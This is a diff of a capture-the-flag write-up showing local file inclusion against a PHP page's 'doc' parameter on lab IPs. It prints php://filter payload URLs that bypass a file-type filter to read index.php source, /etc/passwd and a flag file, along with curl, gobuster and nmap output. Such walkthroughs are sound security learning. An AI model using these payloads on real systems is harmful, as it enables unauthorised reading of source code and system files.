@@ -143,18 +143,9 @@ Starting gobuster in directory enumeration mode
 /server-status        (Status: 403) [Size: 278]
 Progress: 830572 / 830576 (100.00%)
 ```
-curl -I or nmap scan detects only the web server version, which does not help here.
-```
-# nmap -Pn -sV -p80 10.64.130.163
-...
-PORT   STATE SERVICE VERSION
-80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
-```
+The php filter can be bypassed and one way is "http://10.64.130.163/?doc=php://filter/read=pdf/resource=index.php".
 
-PORT   STATE SERVICE VERSION
-80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
-
-The php filter can be bypassed and one way is "http://10.64.130.163/?doc=php://filter/read=pdf/resource=index.php" to view the underlying code, from here I realised its likely easier to use burke suite and alter this to access anyfile or directory filtered out. Either way it supports initial thoughts of filtering files and directory traversal attempts.
+**Non pdf|png file displayed:**
 ```
 <?php
 $doc = isset($_GET['doc']) ? $_GET['doc'] : '';
@@ -209,7 +200,6 @@ readfile("index.php");
 reads: index.php, this used after doc?
 
 Wrapper read:
-
 ```
 readfile("php://filter/convert.base64-encode/resource=index.php");
 ```
@@ -221,20 +211,13 @@ base64 encode
 ↓
 output encoded text
 
-The middle section there is where a filter to convert file is applied here to resource file index.php.
+The middle section there is where a filter to convert file is applied here to resource file index.php. Can be dropped and pass resource to output as seen in index.php example above.
 
-Instead of getting the executed PHP page, this valid filter gives something like:
+Instead of getting the executed PHP page, the above example with this valid filter for base64 gives something like, interesting but not required:
 ```
 PD9waHAKJGRvYyA9ICRfR0VUWydkb2MnXTsK...
 ```
 
-So if read=finds no filter called php,txt or banana it passes file without alternation.
-```
-The following no difference in output from my observation (all status 200, downloaded file passwd):
-php://filter/resource=/etc/passwd
-php://filter/read=banana/resource=/etc/passwd
-php://filter/read=pdf/resource=/etc/passwd
-```
 Similarly its easy progression to see that altering that command its possible to obtain the passwd file with 
 ```
 http://10.64.130.163/?doc=php://filter/resource=/etc/passwd
@@ -247,8 +230,8 @@ ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
 ...
 ```
 From here its not hard to get the flag if you know the locations
-- In this case the passwd file was a waste of time.
-- I tried variations of home/ubuntu directory flag.txt user.txt but if web server var/www made more sense.
+- In this case the passwd file was only beneficial to see directory traversal worked.
+- I tried variations of home/ubuntu directory flag.txt user.txt but since web server var/www made more sense.
 - Conversion of format not required but interesting to try.
 ```
 curl "http://10.67.152.51/index.php?doc=php://filter/resource=/var/www/flag.txt"
